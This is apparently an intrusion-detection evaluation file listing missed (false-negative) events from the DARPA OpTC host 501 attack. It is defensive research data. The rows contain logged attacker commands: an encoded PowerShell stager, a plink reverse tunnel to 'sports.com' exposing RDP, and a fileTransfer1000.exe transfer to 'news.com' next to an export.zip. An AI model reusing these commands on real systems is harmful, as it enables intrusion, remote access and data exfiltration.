rank,node_id,node_group,score,label,pred_above_threshold,attacks,incident_edges,responsible_loss,score_minus_responsible_loss,operation,event_uuid,time_raw,time_eastern,window,target_role,srcnode,dstnode,src_type,dst_type,type_pair,node_label_text,src_label,dst_label,score_band
957,3587,FN_below_threshold,3.311410904,1,0,OPTC h501 attack,16413,3.311410904,0.000000000,DELETE,ee4c0733-ffc0-4ff9-9852-efab7ae599d0,1569340892982000000,2019-09-24 12:01:32.982000 EDT,2019-09-24 12:00:49.653000000~2019-09-24 12:15:50.482000000,src,3587,85475,subject,file,subject->file,subject: /Device/HarddiskVolume1/Windows/system32/svchost.exe,subject: /Device/HarddiskVolume1/Windows/system32/svchost.exe,file: /Device/HarddiskVolume1/ProgramData/MICROSOFT/GROUP POLICY/HISTORY/{59DE43A4-654B-4EB0-9D75-F2F66068034B}/MACHINE/PREFERENCES/SCHEDULEDTASKS/SCHEDULEDTASKS.XML,3.000 to 3.999
2151,3771,FN_below_threshold,3.254313946,1,0,OPTC h501 attack,282,3.254313946,0.000000000,DELETE,db9245b2-2f15-40ae-a02f-440f13c60e12,1569335939116000000,2019-09-24 10:38:59.116000 EDT,2019-09-24 10:29:59.098000000~2019-09-24 10:45:00.019000000,src,3771,78821,subject,file,subject->file,"subject: /Device/HarddiskVolume1/Windows/system32/lsass.exe | ""C:/Program Files (x86)/Microsoft Office/Office15/WINWORD.EXE"" /n ""C:/Users/bantonio/AppData/Local/Microsoft/Windows/INetCache/Content.Outlook/H777GZPT/payroll.docx"" /o """"","subject: /Device/HarddiskVolume1/Windows/system32/lsass.exe | ""C:/Program Files (x86)/Microsoft Office/Office15/WINWORD.EXE"" /n ""C:/Users/bantonio/AppData/Local/Microsoft/Windows/INetCache/Content.Outlook/H777GZPT/payroll.docx"" /o """"",file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Microsoft/Windows/INetCache/Content.Word/~WRS{1D8489CA-4376-4331-B548-C948EA8D246D}.tmp,3.000 to 3.999
2392,3820,FN_below_threshold,3.235416412,1,0,OPTC h501 attack,5508,3.235416412,0.000000000,DELETE,63cd795c-e745-40dd-969b-013e3d02b3cc,1569336262514000000,2019-09-24 10:44:22.514000 EDT,2019-09-24 10:29:59.098000000~2019-09-24 10:45:00.019000000,src,3820,79110,subject,file,subject->file,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/__PSScriptPolicyTest_r1evkga3.y1b.ps1,3.000 to 3.999
2793,3594,FN_below_threshold,3.222006559,1,0,OPTC h501 attack,1935,3.222006559,-0.000000000,MODIFY,e4b40908-b915-4e4e-a636-95c71eab744b,1569417270861000000,2019-09-25 09:14:30.861000 EDT,2019-09-25 09:11:14.913000000~2019-09-25 09:26:16.855000000,src,3594,110045,subject,file,subject->file,subject: /Device/HarddiskVolume1/Windows/System32/svchost.exe | C:/Windows/System32/svchost.exe -k utcsvc,subject: /Device/HarddiskVolume1/Windows/System32/svchost.exe | C:/Windows/System32/svchost.exe -k utcsvc,file: /Device/HarddiskVolume1/ProgramData/Microsoft/Diagnosis/VortexSchemaRequests.dat,3.000 to 3.999
4627,94679,FN_below_threshold,3.182888269,1,0,OPTC h501 attack,14,3.182888269,0.000000000,DELETE,745596d0-aa79-4756-bae3-e64da43211a2,1569346918204000000,2019-09-24 13:41:58.204000 EDT,2019-09-24 13:31:59.621000000~2019-09-24 13:47:14.758000000,dst,5683,94679,subject,file,subject->file,file: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe,subject: /Device/HarddiskVolume1/Windows/Explorer.EXE,file: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe,3.000 to 3.999
5915,3986,FN_below_threshold,2.992310047,1,0,OPTC h501 attack,238,2.992310047,0.000000000,DELETE,ddda3e9a-d23c-4dcf-9525-c4cc16c6e340,1569338773259000000,2019-09-24 11:26:13.259000 EDT,2019-09-24 11:15:17.708000000~2019-09-24 11:30:44.625000000,src,3986,81739,subject,file,subject->file,subject: powershell.exe | C:/Windows/System32/WindowsPowershell/v1.0/powershell -NoProfile -Sta -WindowStyle 1 -EncodedCommand SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAG8AbgAuAE0AYQBqAG8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAUwBzAEUATQBiAGwAeQAuAEcARQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkAZQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwB,subject: powershell.exe | C:/Windows/System32/WindowsPowershell/v1.0/powershell -NoProfile -Sta -WindowStyle 1 -EncodedCommand SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAG8AbgAuAE0AYQBqAG8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAUwBzAEUATQBiAGwAeQAuAEcARQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkAZQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwB,file: /Device/HarddiskVolume1/Windows/Temp/__PSScriptPolicyTest_44leejym.z5z.ps1,2.000 to 2.999
6086,4002,FN_below_threshold,2.896830320,1,0,OPTC h501 attack,3386,2.896830320,0.000000000,DELETE,7cb9cdae-57c4-4b64-9438-529cae27d600,1569339166817000000,2019-09-24 11:32:46.817000 EDT,2019-09-24 11:30:44.683000000~2019-09-24 11:45:46.724000000,src,4002,82016,subject,file,subject->file,subject: powershell.exe,subject: powershell.exe,file: /Device/HarddiskVolume1/Users/administrator.SYSTEMIACOM/AppData/Local/Temp/__PSScriptPolicyTest_2l2pm5jh.ca2.psm1,2.000 to 2.999
7017,3569,FN_below_threshold,2.854289770,1,0,OPTC h501 attack,247,2.854289770,0.000000000,CREATE,3ed8b207-5fe2-4fc0-9166-7dde1f5086b3,1569334604518000000,2019-09-24 10:16:44.518000 EDT,2019-09-24 10:14:44.823000000~2019-09-24 10:29:59.096000000,dst,3,3569,subject,subject,subject->subject,subject: /Device/HarddiskVolume1/Windows/System32/svchost.exe | /SystemRoot/System32/smss.exe,subject: System,subject: /Device/HarddiskVolume1/Windows/System32/svchost.exe | /SystemRoot/System32/smss.exe,2.000 to 2.999
8640,84619,FN_below_threshold,2.364900112,1,0,OPTC h501 attack,4,2.364900112,0.000000000,WRITE,8aa13498-f515-4d8d-bec7-a97ea2928de1,1569339911142000000,2019-09-24 11:45:11.142000 EDT,2019-09-24 11:30:44.683000000~2019-09-24 11:45:46.724000000,dst,4002,84619,subject,file,subject->file,file: /Device/HarddiskVolume1/Windows/system32/plink.exe,subject: powershell.exe,file: /Device/HarddiskVolume1/Windows/system32/plink.exe,2.000 to 2.999
8646,5650,FN_below_threshold,2.361423492,1,0,OPTC h501 attack,300,2.361423492,0.000000000,CREATE,5882d89d-d57f-4e66-86a0-e84c7de809ac,1569345526742000000,2019-09-24 13:18:46.742000 EDT,2019-09-24 13:16:45.685000000~2019-09-24 13:31:59.312000000,dst,5648,5650,subject,subject,subject->subject,"subject: %SystemRoot%/system32/csrss.exe | %SystemRoot%/system32/csrss.exe ObjectDirectory=/Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16",subject: /Device/HarddiskVolume1/Windows/System32/svchost.exe | /SystemRoot/System32/smss.exe 000000e8 00000080 ,"subject: %SystemRoot%/system32/csrss.exe | %SystemRoot%/system32/csrss.exe ObjectDirectory=/Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16",2.000 to 2.999
9104,5560,FN_below_threshold,2.271114111,1,0,OPTC h501 attack,232,2.271114111,0.000000000,WRITE,d826b126-ebb2-453a-803c-c9483a0f9f65,1569345002015000000,2019-09-24 13:10:02.015000 EDT,2019-09-24 13:01:31.764000000~2019-09-24 13:16:45.683000000,src,5560,89882,subject,file,subject->file,"subject: /Device/HarddiskVolume1/Windows/system32/plink.exe | ""C:/Windows/system32/plink.exe"" sports.com -R 4000:127.0.0.1:3389 -l myguest -pw myguest","subject: /Device/HarddiskVolume1/Windows/system32/plink.exe | ""C:/Windows/system32/plink.exe"" sports.com -R 4000:127.0.0.1:3389 -l myguest -pw myguest",file: /Device/HarddiskVolume1/Users/administrator.SYSTEMIACOM/AppData/Local/PUTTY.RND,2.000 to 2.999
10021,3576,FN_below_threshold,2.220579624,1,0,OPTC h501 attack,4157,2.220579624,0.000000000,RENAME,61bb3eef-1700-456b-a387-ceb1979e0474,1569356995003000000,2019-09-24 16:29:55.003000 EDT,2019-09-24 16:19:56.091000000~2019-09-24 16:35:04.786000000,src,3576,70937,subject,file,subject->file,subject: /Device/HarddiskVolume1/Windows/system32/svchost.exe,subject: /Device/HarddiskVolume1/Windows/system32/svchost.exe,node 70937,2.000 to 2.999
11147,5881,FN_below_threshold,2.177191257,1,0,OPTC h501 attack,8,2.177191257,-0.000000000,TERMINATE,53144874-4c6e-405e-8aba-f824427105c9,1569346054651000000,2019-09-24 13:27:34.651000 EDT,2019-09-24 13:16:45.685000000~2019-09-24 13:31:59.312000000,src,5881,5881,subject,subject,subject->subject,"subject: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe | ""C:/Users/sysadmin/Downloads/fileTransfer1000.exe"" --help","subject: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe | ""C:/Users/sysadmin/Downloads/fileTransfer1000.exe"" --help","subject: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe | ""C:/Users/sysadmin/Downloads/fileTransfer1000.exe"" --help",2.000 to 2.999
13507,6053,FN_below_threshold,2.162054539,1,0,OPTC h501 attack,11,2.162054539,-0.000000000,OPEN,8dced36b-44da-4d0e-a000-964527bf2040,1569346953356000000,2019-09-24 13:42:33.356000 EDT,2019-09-24 13:31:59.621000000~2019-09-24 13:47:14.758000000,src,6053,6053,subject,subject,subject->subject,subject: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe,subject: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe,subject: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe,2.000 to 2.999
13508,5970,FN_below_threshold,2.162054539,1,0,OPTC h501 attack,23,2.162054539,-0.000000000,OPEN,5af6ed4c-3dde-461b-8914-3189c0f2bcb3,1569346491446000000,2019-09-24 13:34:51.446000 EDT,2019-09-24 13:31:59.621000000~2019-09-24 13:47:14.758000000,src,5970,5970,subject,subject,subject->subject,subject: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe,subject: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe,subject: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe,2.000 to 2.999
13509,5956,FN_below_threshold,2.162054539,1,0,OPTC h501 attack,27,2.162054539,-0.000000000,OPEN,78113666-5ad0-4754-8cea-e7903d34c301,1569346439888000000,2019-09-24 13:33:59.888000 EDT,2019-09-24 13:31:59.621000000~2019-09-24 13:47:14.758000000,src,5956,5956,subject,subject,subject->subject,subject: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe,subject: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe,subject: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe,2.000 to 2.999
13510,5883,FN_below_threshold,2.162054539,1,0,OPTC h501 attack,9,2.162054539,-0.000000000,TERMINATE,6a2ce46b-a3ab-4f2a-a1a4-39dddd79fdd6,1569346068784000000,2019-09-24 13:27:48.784000 EDT,2019-09-24 13:16:45.685000000~2019-09-24 13:31:59.312000000,src,5883,5883,subject,subject,subject->subject,subject: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe,subject: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe,subject: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe,2.000 to 2.999
15616,5880,FN_below_threshold,2.131642342,1,0,OPTC h501 attack,10,2.131642342,-0.000000000,OPEN,43b0b4e9-0b1e-4166-bbaa-d5a96ec40c34,1569346046996000000,2019-09-24 13:27:26.996000 EDT,2019-09-24 13:16:45.685000000~2019-09-24 13:31:59.312000000,src,5880,5880,subject,subject,subject->subject,"subject: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe | ""C:/Users/sysadmin/Downloads/fileTransfer1000.exe""","subject: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe | ""C:/Users/sysadmin/Downloads/fileTransfer1000.exe""","subject: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe | ""C:/Users/sysadmin/Downloads/fileTransfer1000.exe""",2.000 to 2.999
16375,95241,FN_below_threshold,2.118500233,1,0,OPTC h501 attack,4,2.118500233,0.000000000,CREATE,3dbdd31e-c6dd-4d36-af03-c490a3f56af5,1569346234521000000,2019-09-24 13:30:34.521000 EDT,2019-09-24 13:16:45.685000000~2019-09-24 13:31:59.312000000,dst,5683,95241,subject,file,subject->file,file: /Device/HarddiskVolume1/Users/sysadmin/AppData/Roaming/Microsoft/Windows/Recent/export.zip.lnk,subject: /Device/HarddiskVolume1/Windows/Explorer.EXE,file: /Device/HarddiskVolume1/Users/sysadmin/AppData/Roaming/Microsoft/Windows/Recent/export.zip.lnk,2.000 to 2.999
16480,5773,FN_below_threshold,2.117030144,1,0,OPTC h501 attack,8,2.117030144,0.000000000,TERMINATE,16b3e7d6-e6e7-4567-81ec-cb042b9f1c1e,1569345757625000000,2019-09-24 13:22:37.625000 EDT,2019-09-24 13:16:45.685000000~2019-09-24 13:31:59.312000000,src,5773,5773,subject,subject,subject->subject,subject: /Device/HarddiskVolume1/Windows/System32/mobsync.exe,subject: /Device/HarddiskVolume1/Windows/System32/mobsync.exe,subject: /Device/HarddiskVolume1/Windows/System32/mobsync.exe,2.000 to 2.999
18143,5665,FN_below_threshold,2.106523991,1,0,OPTC h501 attack,68,2.106523991,0.000000000,OPEN,530719ac-5fb4-4cf1-86bc-c02c5f082b13,1569346397269000000,2019-09-24 13:33:17.269000 EDT,2019-09-24 13:31:59.621000000~2019-09-24 13:47:14.758000000,src,5665,5665,subject,subject,subject->subject,subject: /Device/HarddiskVolume1/Windows/system32/SearchProtocolHost.exe,subject: /Device/HarddiskVolume1/Windows/system32/SearchProtocolHost.exe,subject: /Device/HarddiskVolume1/Windows/system32/SearchProtocolHost.exe,2.000 to 2.999
19305,5495,FN_below_threshold,2.103716850,1,0,OPTC h501 attack,25,2.103716850,0.000000000,OPEN,a8784f94-c7ff-418f-bf7d-ac0c3d15d46d,1569344980835000000,2019-09-24 13:09:40.835000 EDT,2019-09-24 13:01:31.764000000~2019-09-24 13:16:45.683000000,src,5495,5495,subject,subject,subject->subject,subject: /Device/HarddiskVolume1/Windows/System32/mobsync.exe | C:/Windows/System32/mobsync.exe -Embedding,subject: /Device/HarddiskVolume1/Windows/System32/mobsync.exe | C:/Windows/System32/mobsync.exe -Embedding,subject: /Device/HarddiskVolume1/Windows/System32/mobsync.exe | C:/Windows/System32/mobsync.exe -Embedding,2.000 to 2.999
23683,3586,FN_below_threshold,2.031339645,1,0,OPTC h501 attack,39626,2.031339645,0.000000000,WRITE,eee4472c-5359-4d68-9beb-f71ac0f7211c,1569334633168000000,2019-09-24 10:17:13.168000 EDT,2019-09-24 10:14:44.823000000~2019-09-24 10:29:59.096000000,src,3586,74084,subject,file,subject->file,subject: /Device/HarddiskVolume1/Windows/System32/svchost.exe,subject: /Device/HarddiskVolume1/Windows/System32/svchost.exe,file: /Device/HarddiskVolume1/ProgramData/Microsoft/Storage Health/StorageEventsArchive.dat,2.000 to 2.999
24563,6072,FN_below_threshold,2.007200003,1,0,OPTC h501 attack,27,2.007200003,0.000000000,OPEN,53e2e80a-2cf1-4f6b-aa1e-f8e897d0a4a5,1569347078028000000,2019-09-24 13:44:38.028000 EDT,2019-09-24 13:31:59.621000000~2019-09-24 13:47:14.758000000,src,6072,6072,subject,subject,subject->subject,subject: /SystemRoot/System32/smss.exe | fileTransfer1000.exe  news.com 9999 ,subject: /SystemRoot/System32/smss.exe | fileTransfer1000.exe  news.com 9999 ,subject: /SystemRoot/System32/smss.exe | fileTransfer1000.exe  news.com 9999 ,2.000 to 2.999
24646,78489,FN_below_threshold,2.004661083,1,0,OPTC h501 attack,7,2.004661083,0.000000000,MODIFY,79a613fd-06df-4d05-8bc6-93d1657b3f0c,1569335703648000000,2019-09-24 10:35:03.648000 EDT,2019-09-24 10:29:59.098000000~2019-09-24 10:45:00.019000000,dst,3680,78489,subject,file,subject->file,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Microsoft/Windows/INetCache/Content.Outlook/H777GZPT/payroll.docx,subject: /Device/HarddiskVolume1/Program Files (x86)/Microsoft Office/Office15/OUTLOOK.EXE,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Microsoft/Windows/INetCache/Content.Outlook/H777GZPT/payroll.docx,2.000 to 2.999
36058,95249,FN_below_threshold,1.470703483,1,0,OPTC h501 attack,5,1.470703483,0.000000000,RENAME,ade37c4c-ebb0-401a-91c9-f58c8825a30a,1569346261000000000,2019-09-24 13:31:01.000000 EDT,2019-09-24 13:16:45.685000000~2019-09-24 13:31:59.312000000,dst,5683,95249,subject,file,subject->file,file: /Device/HarddiskVolume1/Users/sysadmin/Downloads/export.zip,subject: /Device/HarddiskVolume1/Windows/Explorer.EXE,file: /Device/HarddiskVolume1/Users/sysadmin/Downloads/export.zip,1.000 to 1.999
37049,96925,FN_below_threshold,1.282778382,1,0,OPTC h501 attack,5,1.282778382,0.000000000,CREATE,e95350cf-5579-46c7-aa5f-15e04a6ee2a9,1569346936066000000,2019-09-24 13:42:16.066000 EDT,2019-09-24 13:31:59.621000000~2019-09-24 13:47:14.758000000,dst,5693,96925,subject,file,subject->file,file: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe:Zone.Identifier,subject: /Device/HarddiskVolume1/Program Files (x86)/Google/Chrome/Application/chrome.exe,file: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe:Zone.Identifier,1.000 to 1.999
37050,94234,FN_below_threshold,1.282778382,1,0,OPTC h501 attack,6,1.282778382,0.000000000,MODIFY,3c2ae861-6e24-4516-a780-995c367a00e1,1569345978162000000,2019-09-24 13:26:18.162000 EDT,2019-09-24 13:16:45.685000000~2019-09-24 13:31:59.312000000,dst,5693,94234,subject,file,subject->file,file: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe:Zone.Identifier,subject: /Device/HarddiskVolume1/Program Files (x86)/Google/Chrome/Application/chrome.exe,file: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe:Zone.Identifier,1.000 to 1.999
37714,78490,FN_below_threshold,1.234019518,1,0,OPTC h501 attack,6,1.234019518,0.000000000,MODIFY,a0ee67f3-61ad-456a-b13f-8615863ded74,1569335703655000000,2019-09-24 10:35:03.655000 EDT,2019-09-24 10:29:59.098000000~2019-09-24 10:45:00.019000000,dst,3680,78490,subject,file,subject->file,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Microsoft/Windows/INetCache/Content.Outlook/H777GZPT/payroll.docx:Zone.Identifier,subject: /Device/HarddiskVolume1/Program Files (x86)/Microsoft Office/Office15/OUTLOOK.EXE,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Microsoft/Windows/INetCache/Content.Outlook/H777GZPT/payroll.docx:Zone.Identifier,1.000 to 1.999
38956,87266,FN_below_threshold,1.170033097,1,0,OPTC h501 attack,191,1.170033097,0.000000000,MODIFY,04eca062-dfb9-456a-94ed-52e2ae88643c,1569376871019000000,2019-09-24 22:01:11.019000 EDT,2019-09-24 21:57:11.418000000~2019-09-24 22:12:11.579000000,dst,3586,87266,subject,file,subject->file,file: /Device/HarddiskVolume1/Windows/SysWOW64/kernelbase.dll,subject: /Device/HarddiskVolume1/Windows/System32/svchost.exe,file: /Device/HarddiskVolume1/Windows/SysWOW64/kernelbase.dll,1.000 to 1.999
43650,79751,FN_below_threshold,1.135108948,1,0,OPTC h501 attack,4,1.135108948,0.000000000,MODIFY,1e4d427a-cf4f-4051-85d8-2e38a1650158,1569337691224000000,2019-09-24 11:08:11.224000 EDT,2019-09-24 11:00:09.457000000~2019-09-24 11:15:17.099000000,dst,3586,79751,subject,file,subject->file,file: /Device/HarddiskVolume1/windows/system32/mobsync.exe,subject: /Device/HarddiskVolume1/Windows/System32/svchost.exe,file: /Device/HarddiskVolume1/windows/system32/mobsync.exe,1.000 to 1.999
43845,81951,FN_below_threshold,1.124031425,1,0,OPTC h501 attack,2,1.124031425,0.000000000,MODIFY,7734efc3-5db3-47e4-9db0-d372da12ff84,1569338893152000000,2019-09-24 11:28:13.152000 EDT,2019-09-24 11:15:17.708000000~2019-09-24 11:30:44.625000000,dst,3586,81951,subject,file,subject->file,file: /Device/HarddiskVolume1/WINDOWS/SYSTEM32/GROUPPOLICY/DATASTORE/0/SYSVOL/SYSTEMIA.COM/POLICIES/{37412A2E-7EDB-406E-ABD8-FA6E1FEA5326}/MACHINE,subject: /Device/HarddiskVolume1/Windows/System32/svchost.exe,file: /Device/HarddiskVolume1/WINDOWS/SYSTEM32/GROUPPOLICY/DATASTORE/0/SYSVOL/SYSTEMIA.COM/POLICIES/{37412A2E-7EDB-406E-ABD8-FA6E1FEA5326}/MACHINE,1.000 to 1.999
43861,81949,FN_below_threshold,1.120418191,1,0,OPTC h501 attack,2,1.120418191,-0.000000000,MODIFY,a80b0358-84b2-484f-b6f6-e3f76cd3d15f,1569338893015000000,2019-09-24 11:28:13.015000 EDT,2019-09-24 11:15:17.708000000~2019-09-24 11:30:44.625000000,dst,3586,81949,subject,file,subject->file,file: /Device/HarddiskVolume1/WINDOWS/SYSTEM32/GROUPPOLICY/DATASTORE/0/SYSVOL/SYSTEMIA.COM/POLICIES/{46A9A8CB-E14C-4589-8465-35231C3587DD}/MACHINE,subject: /Device/HarddiskVolume1/Windows/System32/svchost.exe,file: /Device/HarddiskVolume1/WINDOWS/SYSTEM32/GROUPPOLICY/DATASTORE/0/SYSVOL/SYSTEMIA.COM/POLICIES/{46A9A8CB-E14C-4589-8465-35231C3587DD}/MACHINE,1.000 to 1.999
43862,81950,FN_below_threshold,1.120267391,1,0,OPTC h501 attack,2,1.120267391,0.000000000,MODIFY,f6e68ef4-5494-4725-bd9c-644d5d760ba9,1569338893151000000,2019-09-24 11:28:13.151000 EDT,2019-09-24 11:15:17.708000000~2019-09-24 11:30:44.625000000,dst,3586,81950,subject,file,subject->file,file: /Device/HarddiskVolume1/WINDOWS/SYSTEM32/GROUPPOLICY/DATASTORE/0/SYSVOL/SYSTEMIA.COM/POLICIES/{59DE43A4-654B-4EB0-9D75-F2F66068034B}/MACHINE,subject: /Device/HarddiskVolume1/Windows/System32/svchost.exe,file: /Device/HarddiskVolume1/WINDOWS/SYSTEM32/GROUPPOLICY/DATASTORE/0/SYSVOL/SYSTEMIA.COM/POLICIES/{59DE43A4-654B-4EB0-9D75-F2F66068034B}/MACHINE,1.000 to 1.999
44745,822634,FN_below_threshold,1.001472950,1,0,OPTC h501 attack,2,1.001472950,0.000000000,START,b2fc748e-d7e8-4323-b720-bdf4084de636,1569338103916000000,2019-09-24 11:15:03.916000 EDT,2019-09-24 11:00:09.457000000~2019-09-24 11:15:17.099000000,dst,3820,822634,subject,netflow,subject->netflow,netflow 142.20.57.246:53278->202.6.172.98:443,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 142.20.57.246:53278->202.6.172.98:443,1.000 to 1.999
44746,822463,FN_below_threshold,1.001472950,1,0,OPTC h501 attack,2,1.001472950,0.000000000,START,f03b91c2-9f7b-44e0-a93a-e92c161a0fc9,1569338073767000000,2019-09-24 11:14:33.767000 EDT,2019-09-24 11:00:09.457000000~2019-09-24 11:15:17.099000000,dst,3820,822463,subject,netflow,subject->netflow,netflow 142.20.57.246:53277->202.6.172.98:443,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 142.20.57.246:53277->202.6.172.98:443,1.000 to 1.999
44747,822394,FN_below_threshold,1.001472950,1,0,OPTC h501 attack,2,1.001472950,0.000000000,MESSAGE,f5729085-cbaa-4f71-bebe-f99e7e3e03ab,1569338043511000000,2019-09-24 11:14:03.511000 EDT,2019-09-24 11:00:09.457000000~2019-09-24 11:15:17.099000000,dst,3820,822394,subject,netflow,subject->netflow,netflow 142.20.57.246:53275->202.6.172.98:443,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 142.20.57.246:53275->202.6.172.98:443,1.000 to 1.999
44748,822289,FN_below_threshold,1.001472950,1,0,OPTC h501 attack,2,1.001472950,0.000000000,MESSAGE,8bda1df7-815a-4f4e-8430-3b81b470d2c9,1569338013102000000,2019-09-24 11:13:33.102000 EDT,2019-09-24 11:00:09.457000000~2019-09-24 11:15:17.099000000,dst,3820,822289,subject,netflow,subject->netflow,netflow 142.20.57.246:53274->202.6.172.98:443,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 142.20.57.246:53274->202.6.172.98:443,1.000 to 1.999
44749,822286,FN_below_threshold,1.001472950,1,0,OPTC h501 attack,2,1.001472950,0.000000000,MESSAGE,aac30c73-3317-4c5a-b64a-a8a94c54703d,1569338012781000000,2019-09-24 11:13:32.781000 EDT,2019-09-24 11:00:09.457000000~2019-09-24 11:15:17.099000000,dst,3820,822286,subject,netflow,subject->netflow,netflow 142.20.57.246:53268->202.6.172.98:443,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 142.20.57.246:53268->202.6.172.98:443,1.000 to 1.999
44750,822100,FN_below_threshold,1.001472950,1,0,OPTC h501 attack,2,1.001472950,0.000000000,MESSAGE,58d65227-b662-46e6-a567-89fcc96e69e2,1569337982041000000,2019-09-24 11:13:02.041000 EDT,2019-09-24 11:00:09.457000000~2019-09-24 11:15:17.099000000,dst,3820,822100,subject,netflow,subject->netflow,netflow 142.20.57.246:53266->202.6.172.98:443,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 142.20.57.246:53266->202.6.172.98:443,1.000 to 1.999
